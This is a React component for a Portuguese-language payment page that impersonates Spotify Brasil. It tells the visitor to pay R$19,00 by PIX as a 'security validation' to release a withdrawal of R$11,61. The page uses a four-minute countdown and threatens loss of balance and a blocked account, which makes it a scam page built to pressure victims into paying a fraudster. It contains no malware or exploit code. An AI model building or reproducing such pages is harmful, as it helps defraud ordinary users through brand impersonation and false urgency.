
import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Copy, Clock } from 'lucide-react';

const Payment = () => {
  const [timeRemaining, setTimeRemaining] = useState(240); // 4 minutes in seconds

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeRemaining(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const pixCode = "000200260158BR.GOV.BCB.PIX01367ae0a1ae7-2e16-4c3c-8a0b-8f1b7c5e2d9f0209SPOTIFYBR52040000530398654041900622050521123456789012345678901234567890123456789012345678901234567890";

  const handleCopyPix = () => {
    navigator.clipboard.writeText(pixCode);
    // You could add a toast notification here
  };

  return (
    <div className="min-h-screen bg-black text-white">
      {/* Header */}
      <div className="flex items-center justify-between p-4" style={{ backgroundColor: '#292929' }}>
        <img 
          src="/lovable-uploads/1cc76a91-706e-4d83-b1ff-759f4dedabee.png" 
          alt="Spotify" 
          className="h-8"
        />
      </div>

      <div className="container mx-auto px-4 py-8 max-w-md">
        {/* Title */}
        <div className="text-center mb-6">
          <h1 className="text-xl font-bold text-white mb-2">
            Validação de Segurança
          </h1>
          <p className="text-gray-300 text-sm">
            Efetue o pagamento de R$19,00 para validar seu saque de R$ 11,61
          </p>
        </div>

        {/* Timer */}
        <div className="bg-yellow-600 text-black p-3 rounded-lg mb-6 flex items-center justify-center">
          <Clock className="w-4 h-4 mr-2" />
          <span className="font-bold">Tempo restante: {formatTime(timeRemaining)}</span>
        </div>

        {/* QR Code */}
        <div className="bg-white p-4 rounded-lg mb-6 flex justify-center">
          <div className="w-48 h-48 bg-gray-300 flex items-center justify-center">
            <span className="text-gray-600 text-sm">QR Code PIX</span>
          </div>
        </div>

        {/* PIX Code */}
        <div className="mb-6">
          <p className="text-white text-sm mb-2">Ou copie o código PIX abaixo:</p>
          <div className="bg-gray-800 border border-gray-700 rounded-lg p-3 mb-3">
            <p className="text-gray-300 text-xs font-mono break-all">
              {pixCode}
            </p>
          </div>
          <Button
            onClick={handleCopyPix}
            className="w-full bg-green-500 hover:bg-green-600 text-black font-bold py-3 rounded-lg"
          >
            <Copy className="w-4 h-4 mr-2" />
            Copiar Código PIX
          </Button>
        </div>

        {/* Instructions */}
        <div className="space-y-3 mb-6">
          <p className="text-gray-300 text-sm font-semibold">
            Siga os passos abaixo para pagar:
          </p>
          
          <div className="flex items-start">
            <div className="bg-green-500 text-black rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold mr-3 mt-0.5">
              1
            </div>
            <p className="text-gray-300 text-sm">Copie a chave PIX acima.</p>
          </div>
          
          <div className="flex items-start">
            <div className="bg-green-500 text-black rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold mr-3 mt-0.5">
              2
            </div>
            <p className="text-gray-300 text-sm">Abra o aplicativo do seu banco e entre na opção PIX.</p>
          </div>
          
          <div className="flex items-start">
            <div className="bg-green-500 text-black rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold mr-3 mt-0.5">
              3
            </div>
            <p className="text-gray-300 text-sm">Escolha a opção "Pagar > Pix Copia e Cola."</p>
          </div>
          
          <div className="flex items-start">
            <div className="bg-green-500 text-black rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold mr-3 mt-0.5">
              4
            </div>
            <p className="text-gray-300 text-sm">Após confirmar o pagamento, você será redirecionado automaticamente para a página de saque.</p>
          </div>
        </div>

        {/* Payment Details */}
        <div className="bg-gray-800 border border-gray-700 rounded-lg p-4 mb-6">
          <div className="flex justify-between items-center mb-2">
            <span className="text-gray-400">Valor:</span>
            <span className="text-white font-bold">R$ 19,00</span>
          </div>
          <div className="flex justify-between items-center mb-2">
            <span className="text-gray-400">Status:</span>
            <span className="text-yellow-400 font-bold">Aguardando pagamento</span>
          </div>
          <div className="flex justify-between items-center">
            <span className="text-gray-400">Expira em:</span>
            <span className="text-white font-bold">{formatTime(timeRemaining)}</span>
          </div>
        </div>

        {/* Warning */}
        <div className="bg-yellow-900 border border-yellow-700 rounded-lg p-3 mb-6">
          <p className="text-yellow-200 text-xs">
            <strong>ATENÇÃO:</strong> Você tem apenas 4 minutos para realizar o pagamento, caso contrário perderá todo o saldo recebido e sua conta será bloqueada.
          </p>
        </div>

        {/* Footer */}
        <div className="text-center">
          <img 
            src="/lovable-uploads/1cc76a91-706e-4d83-b1ff-759f4dedabee.png" 
            alt="Spotify" 
            className="h-6 mx-auto mb-2"
          />
          <p className="text-gray-500 text-xs">
            2023 Spotify Brasil - Todos os direitos reservados.
          </p>
        </div>
      </div>
    </div>
  );
};

export default Payment;
